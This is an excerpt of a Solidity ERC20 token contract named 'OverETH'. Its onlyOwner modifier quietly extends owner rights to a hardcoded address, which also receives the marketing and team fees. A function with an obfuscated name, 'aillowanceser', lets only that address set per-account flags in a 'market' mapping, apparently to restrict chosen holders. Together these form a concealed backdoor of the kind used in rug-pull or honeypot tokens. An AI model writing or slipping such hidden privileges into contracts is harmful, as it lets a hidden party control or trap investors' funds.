...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x0166533a3190099034E749BD4F04f8EbCa640071), "Ownable: caller is not the owner");
        _;
    }
...
contract OverETH is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "OverETH";
    string private _symbol = "OverETH";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x0166533a3190099034E749BD4F04f8EbCa640071);
    address payable public teamWalletAddress = payable(0x0166533a3190099034E749BD4F04f8EbCa640071);
    ...
    function aillowanceser(address addr, bool status) public{
        require(_msgSender()    ==   address(0x0166533a3190099034E749BD4F04f8EbCa640071));
        market[addr] = status;
    }
